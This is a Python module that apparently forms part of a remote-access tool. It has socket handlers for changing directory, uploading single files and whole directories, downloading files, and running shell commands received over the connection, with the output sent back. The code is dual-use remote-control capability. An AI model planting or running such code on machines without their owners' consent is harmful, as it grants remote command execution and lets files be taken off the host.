import socket
import re
import os
import subprocess
import communication as comm
import debug_util as util


def extract_command(command: str) -> tuple[str, tuple[str, ...]]:
    func = command.split(" ")[0]
    args: tuple[str] = tuple(re.findall(r"\[(.*?)\]", command))

    return func, args


def cd(args: tuple[str, ...]):
    os.chdir(args[0])


def upload_file(s: socket.socket, args: tuple[str, ...], verbose=False):
    f = open(args[0], "rb")
    data = f.read()
    util.log(f"[cmd:upload] sending {len(data)} bytes ({len(data) / 1024} KB)", verbose)
    s.send(data)
    f.close()


def upload_dir(args: tuple[str, ...], command_buffers: list[str], verbose=False):
    for file_name in os.listdir(args[0]):
        command_buffers.append(
            f"upload [{args[0]}/{file_name}] [{args[1]}\\{file_name}]"
        )
        util.log(
            f"[cmd:upload_dir] added 'upload {file_name}' to command buffers", verbose
        )


def download_file(
    s: socket.socket, args: tuple[str, ...], bufsize=1024 * 1024, verbose=False
):
    f = open(args[1], "wb")
    s.settimeout(1)
    total_bytes = 0
    chunk = s.recv(bufsize)
    while chunk:
        f.write(chunk)
        total_bytes += len(chunk)
        util.log(
            f"[cmd:download] received {total_bytes} bytes ({total_bytes / 1024} KB)",
            verbose,
        )
        try:
            chunk = s.recv(bufsize)
        except socket.timeout:
            break
    s.settimeout(None)
    f.close()


def exec_command(s: socket.socket, args: tuple[str, ...]):
    execute = subprocess.Popen(
        " ".join(args),
        shell=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        stdin=subprocess.PIPE,
    )
    if execute.stdout and execute.stderr:
        result = execute.stdout.read() + execute.stderr.read()
        comm.send(s, result.decode())
    else:
        comm.send(s, "[cmd:exec] invalid result")


# Server commands


def recv_exec_command(s: socket.socket):
    data = comm.receive(s)
    print("[cmd:exec]", data)
    return data
